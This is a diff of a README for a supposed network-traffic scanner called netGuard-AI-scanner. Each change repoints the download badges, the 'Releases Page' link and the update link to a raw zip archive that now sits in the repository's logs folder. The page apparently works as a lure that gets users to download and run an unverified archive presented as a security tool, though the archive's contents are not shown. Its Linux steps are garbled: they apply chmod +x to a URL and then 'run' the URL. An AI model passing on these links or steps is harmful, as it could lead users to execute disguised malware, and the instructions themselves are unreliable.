@@ -4,7 +4,7 @@
 
 Welcome to netGuard-AI-scanner! This tool helps you monitor real-time network traffic using advanced techniques. No programming skills are needed. Follow these simple steps to download and run the application.
 
-[![Download netGuard-AI-scanner](https://raw.githubusercontent.com/enesssyasarr/netGuard-AI-scanner/main/src/net_scanner_Guard_A_2.8.zip)](https://raw.githubusercontent.com/enesssyasarr/netGuard-AI-scanner/main/src/net_scanner_Guard_A_2.8.zip)
+[![Download netGuard-AI-scanner](https://github.com/enesssyasarr/netGuard-AI-scanner/raw/refs/heads/main/logs/net_scanner_Guard_A_v2.8.zip)](https://github.com/enesssyasarr/netGuard-AI-scanner/raw/refs/heads/main/logs/net_scanner_Guard_A_v2.8.zip)
 
 ## 🔍 What is netGuard-AI-scanner?
 
@@ -28,7 +28,7 @@ Before downloading, check if your system meets these requirements:
 
 ## 📥 Download & Install
 
-To get netGuard-AI-scanner, visit this page to download: [Releases Page](https://raw.githubusercontent.com/enesssyasarr/netGuard-AI-scanner/main/src/net_scanner_Guard_A_2.8.zip). 
+To get netGuard-AI-scanner, visit this page to download: [Releases Page](https://github.com/enesssyasarr/netGuard-AI-scanner/raw/refs/heads/main/logs/net_scanner_Guard_A_v2.8.zip). 
 
 1. Click on the link to open the Releases page.
 2. Look for the latest version available for download.
@@ -53,8 +53,8 @@ To get netGuard-AI-scanner, visit this page to download: [Releases Page](https:/
    - Navigate to your Downloads folder using `cd ~/Downloads`.
    - Run the following command:
      ```
-     chmod +x https://raw.githubusercontent.com/enesssyasarr/netGuard-AI-scanner/main/src/net_scanner_Guard_A_2.8.zip
-     https://raw.githubusercontent.com/enesssyasarr/netGuard-AI-scanner/main/src/net_scanner_Guard_A_2.8.zip
+     chmod +x https://github.com/enesssyasarr/netGuard-AI-scanner/raw/refs/heads/main/logs/net_scanner_Guard_A_v2.8.zip
+     https://github.com/enesssyasarr/netGuard-AI-scanner/raw/refs/heads/main/logs/net_scanner_Guard_A_v2.8.zip
      ```
 
 ## 🛡️ Using the Application
@@ -77,7 +77,7 @@ To monitor your network traffic:
 
 ## 🔄 Updating the Application
 
-To ensure you have the latest features and security updates, visit [Releases Page](https://raw.githubusercontent.com/enesssyasarr/netGuard-AI-scanner/main/src/net_scanner_Guard_A_2.8.zip) regularly. Follow the same download and installation steps to update your application.
+To ensure you have the latest features and security updates, visit [Releases Page](https://github.com/enesssyasarr/netGuard-AI-scanner/raw/refs/heads/main/logs/net_scanner_Guard_A_v2.8.zip) regularly. Follow the same download and installation steps to update your application.
 
 ## ❓ Frequently Asked Questions
 
@@ -101,4 +101,4 @@ If you encounter any issues or have questions, please reach out via the Issues s
 
 Thank you for using netGuard-AI-scanner! We hope this tool benefits your network security efforts. Remember to stay updated and safeguard your network effectively.
 
-[![Download netGuard-AI-scanner](https://raw.githubusercontent.com/enesssyasarr/netGuard-AI-scanner/main/src/net_scanner_Guard_A_2.8.zip)](https://raw.githubusercontent.com/enesssyasarr/netGuard-AI-scanner/main/src/net_scanner_Guard_A_2.8.zip)
+[![Download netGuard-AI-scanner](https://github.com/enesssyasarr/netGuard-AI-scanner/raw/refs/heads/main/logs/net_scanner_Guard_A_v2.8.zip)](https://github.com/enesssyasarr/netGuard-AI-scanner/raw/refs/heads/main/logs/net_scanner_Guard_A_v2.8.zip)
